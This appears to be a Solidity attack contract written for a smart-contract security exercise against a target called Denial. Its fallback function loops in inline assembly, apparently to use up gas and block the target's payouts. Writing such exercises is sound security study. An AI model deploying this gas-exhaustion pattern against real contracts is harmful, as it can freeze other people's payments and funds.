// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    fallback() external payable {
        for (uint256 i = 0; i < 90; i++) {
            uint256 size;
            address addr = contractAddress;
            assembly {
                size := add(extcodesize(addr), i)
            }
        }
    }
}
